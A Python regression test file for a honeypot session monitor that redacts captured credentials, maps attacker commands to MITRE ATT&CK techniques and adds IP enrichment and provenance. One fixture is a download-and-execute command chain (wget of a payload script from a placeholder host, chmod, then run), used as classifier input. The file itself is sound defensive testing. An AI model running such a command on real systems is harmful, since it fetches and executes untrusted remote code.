from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from production.workers.session_monitor import SessionMonitor, SessionState, build_pipeline_trigger
from production.classification.classification_pipeline import NotebookParityClassifier


def _command_event(session="s1", src_ip="203.0.113.10", command="whoami"):
    return {
        "eventid": "cowrie.command.input",
        "session": session,
        "src_ip": src_ip,
        "timestamp": "2026-05-12T00:00:00Z",
        "input": command,
    }


def test_credentials_are_redacted_and_hashed():
    monitor = SessionMonitor()
    monitor.on_event({
        "eventid": "cowrie.login.success",
        "session": "cred-1",
        "src_ip": "203.0.113.10",
        "timestamp": "2026-05-12T00:00:00Z",
        "username": "root",
        "password": "secret123",
    })

    state = monitor.get_session("cred-1")
    assert state.login_password == "[REDACTED]"
    assert state.login_password_redacted == "[REDACTED]"
    assert state.login_password_hash.startswith("sha256:")
    assert "secret123" not in str(state.raw_events)
    assert state.raw_events[0]["password"] == "[REDACTED]"
    assert state.raw_events[0]["password_hash"] == state.login_password_hash


def test_raw_credentials_require_explicit_opt_in():
    monitor = SessionMonitor(
        credential_policy={
            "store_raw_credentials": True,
            "sanitize_raw_events": False,
        }
    )
    monitor.on_event({
        "eventid": "cowrie.login.success",
        "session": "cred-2",
        "src_ip": "203.0.113.10",
        "timestamp": "2026-05-12T00:00:00Z",
        "username": "root",
        "password": "secret123",
    })

    state = monitor.get_session("cred-2")
    assert state.login_password == "secret123"
    assert state.raw_events[0]["password"] == "secret123"
    assert state.credential_metadata["raw_password_stored"] is True


def test_classification_policy_fallback_sources():
    def high_bert(_cmd):
        return "T9999", 0.95

    def low_bert(_cmd):
        return "T9999", 0.10

    securebert_first = SessionMonitor(bert_fn=high_bert)
    assert securebert_first._classify_with_source("whoami") == (
        "T9999", "unknown", "securebert", 0.95
    )

    rules_first = SessionMonitor(
        bert_fn=high_bert,
        classification_policy={"strategy": "rules_first"},
    )
    assert rules_first._classify_with_source("whoami") == (
        "T1033", "discovery", "rule", 1.0
    )

    low_conf = SessionMonitor(bert_fn=low_bert)
    assert low_conf._classify_with_source("whoami") == (
        "T1033", "discovery", "rule", 1.0
    )


def test_session_monitor_records_ordered_subcommand_classifications():
    command = "wget http://x/payload.sh -O /tmp/a && chmod +x /tmp/a && /tmp/a"

    class FakeMitre:
        def get_tactics(self, ttp):
            return {
                "T1105": ["command-and-control"],
                "T1059": ["execution"],
                "T1222": ["defense-evasion"],
            }.get(ttp, [])

        def get_name(self, ttp):
            return {
                "T1105": "Ingress Tool Transfer",
                "T1059": "Command and Scripting Interpreter",
                "T1222": "File and Directory Permissions Modification",
            }.get(ttp, ttp)

    classifier = NotebookParityClassifier(
        bert_fn=lambda _cmd: (None, 0.0),
        mitre_db=FakeMitre(),
    )
    monitor = SessionMonitor(
        mitre_db=FakeMitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    monitor.on_event(_command_event(session="compound-1", command=command))

    state = monitor.get_session("compound-1")
    assert state.commands == [command]
    assert state.ttps == ["T1105", "T1222", "T1059"]
    assert state.tactics == ["command-and-control", "defense-evasion", "execution"]
    classified_commands = [
        event["command"]
        for event in state.classification_events
        if event.get("ttp")
    ]
    assert classified_commands == [
        "wget http://x/payload.sh -O /tmp/a",
        "chmod +x /tmp/a",
        "/tmp/a",
    ]
    assert all(event.get("original_command") == command for event in state.classification_events)
    assert state.ttp_command_map["T1105"] == ["wget http://x/payload.sh -O /tmp/a"]
    assert state.ttp_command_map["T1222"] == ["chmod +x /tmp/a"]
    assert state.ttp_command_map["T1059"] == ["/tmp/a"]
    assert [event["source"] for event in state.classification_events] == [
        "rule",
        "rule",
        "rule",
    ]


def test_enrichment_is_available_before_campaign_registration():
    enrichment_db = {
        "203.0.113.10": {
            "asn": "AS64500",
            "isp": "Example Transit",
            "geo": "TH",
        }
    }
    monitor = SessionMonitor(enrichment_db=enrichment_db)
    monitor.on_event(_command_event())
    monitor.on_event({
        "eventid": "cowrie.session.closed",
        "session": "s1",
        "src_ip": "203.0.113.10",
        "timestamp": "2026-05-12T00:00:10Z",
        "duration": 10,
    })

    state = monitor.get_session("s1")
    assert state.asn == "AS64500"
    assert state.enrichment_status["status"] == "applied"
    assert monitor.campaign_tracker._profiles[0]["asn"] == "AS64500"


def test_pipeline_trigger_adds_data_provenance():
    class FakeCoordinator:
        def __init__(self, base_url="", model="", max_tokens=4000):
            self.max_tokens = max_tokens

        async def analyze(self, *args, **kwargs):
            return {
                "confidence": "high",
                "ai_enriched": False,
                "confidence_source": "test",
            }

    state = SessionState(
        session_id="s-prov",
        src_ip="203.0.113.10",
        start_time="2026-05-12T00:00:00Z",
    )
    state.commands.append("whoami")
    state.commands_success.append("whoami")
    state.ttps.append("T1033")
    state.tactics.append("discovery")
    state.ttp_command_map["T1033"] = ["whoami"]
    state.ttp_sources["T1033"] = ["keyword"]
    state.classification_policy = {"strategy": "rules_first"}
    state.credential_metadata = {"raw_password_stored": False}
    state.raw_events.append(_command_event(session="s-prov"))

    trigger = build_pipeline_trigger(FakeCoordinator)
    result = trigger(state)
    assert result["data_provenance"]["session"]["session_id"] == "s-prov"
    assert result["data_provenance"]["classification"]["ttp_sources"]["T1033"] == ["keyword"]
    assert result["data_provenance"]["credentials"]["raw_password_stored"] is False


if __name__ == "__main__":
    tests = [
        test_credentials_are_redacted_and_hashed,
        test_raw_credentials_require_explicit_opt_in,
        test_classification_policy_fallback_sources,
        test_session_monitor_records_ordered_subcommand_classifications,
        test_enrichment_is_available_before_campaign_registration,
        test_pipeline_trigger_adds_data_provenance,
    ]
    for test in tests:
        test()
    print(f"{len(tests)} regression tests passed")
